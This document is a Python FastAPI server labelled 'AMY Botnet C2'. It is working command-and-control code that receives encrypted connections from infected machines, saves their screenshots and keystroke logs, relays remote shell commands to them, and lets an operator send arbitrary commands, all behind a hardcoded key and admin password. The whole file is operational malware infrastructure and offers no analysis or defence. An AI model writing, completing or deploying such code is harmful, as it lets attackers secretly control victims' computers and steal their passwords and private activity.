import asyncio
import base64
import os
import secrets
from datetime import datetime
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Depends, HTTPException, status
from fastapi.responses import HTMLResponse
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

app = FastAPI(title="AMY Botnet C2")

security = HTTPBasic()

# 32 bytes key for AES-256
AES_KEY = b"AMY_BOTNET_2026_SECRET_KEY_1337A"

active_bots = {}
terminal_connections = {}

os.makedirs("screenshots", exist_ok=True)
os.makedirs("logs", exist_ok=True)

def encrypt_message(msg: str) -> str:
    aesgcm = AESGCM(AES_KEY)
    nonce = os.urandom(12)
    ct = aesgcm.encrypt(nonce, msg.encode('utf-8'), None)
    return base64.b64encode(nonce + ct).decode('utf-8')

def decrypt_message(encoded: str) -> str:
    try:
        data = base64.b64decode(encoded)
        nonce, ct = data[:12], data[12:]
        aesgcm = AESGCM(AES_KEY)
        return aesgcm.decrypt(nonce, ct, None).decode('utf-8', errors='ignore')
    except Exception as e:
        return ""

def get_current_username(credentials: HTTPBasicCredentials = Depends(security)):
    correct_username = secrets.compare_digest(credentials.username, "admin")
    correct_password = secrets.compare_digest(credentials.password, "amyadmin123")
    if not (correct_username and correct_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Basic"},
        )
    return credentials.username

@app.get("/", response_class=HTMLResponse)
async def dashboard(username: str = Depends(get_current_username)):
    with open("ui/index.html", encoding="utf-8") as f:
        return f.read()

@app.websocket("/ws/{bot_id}")
async def bot_connection(websocket: WebSocket, bot_id: str):
    await websocket.accept()
    active_bots[bot_id] = websocket
    print(f"[+] Bot {bot_id} connected")
    try:
        while True:
            encrypted_data = await websocket.receive_text()
            data = decrypt_message(encrypted_data)
            if not data:
                continue
                
            if data.startswith("SCREENSHOT:"):
                img_data = base64.b64decode(data[11:])
                filename = f"screenshots/{bot_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                with open(filename, "wb") as f:
                    f.write(img_data)
            elif data.startswith("KEYLOG:"):
                with open(f"logs/{bot_id}_keylog.txt", "a", encoding="utf-8") as f:
                    f.write(data[7:] + "\n")
            elif data.startswith("TERMINAL:"):
                if bot_id in terminal_connections:
                    await terminal_connections[bot_id].send_text(data[9:])
    except WebSocketDisconnect:
        active_bots.pop(bot_id, None)

@app.websocket("/terminal/{bot_id}")
async def terminal_connection(websocket: WebSocket, bot_id: str):
    await websocket.accept()
    terminal_connections[bot_id] = websocket
    try:
        while True:
            cmd = await websocket.receive_text()
            if bot_id in active_bots:
                await active_bots[bot_id].send_text(encrypt_message(f"shell:{cmd}"))
    except WebSocketDisconnect:
        terminal_connections.pop(bot_id, None)

@app.get("/bots")
async def list_bots(username: str = Depends(get_current_username)):
    return {"bots": list(active_bots.keys())}

@app.post("/command")
async def send_command(bot_id: str, command: str, username: str = Depends(get_current_username)):
    if bot_id in active_bots:
        await active_bots[bot_id].send_text(encrypt_message(command))
        return {"status": "sent"}
    return {"status": "error"}
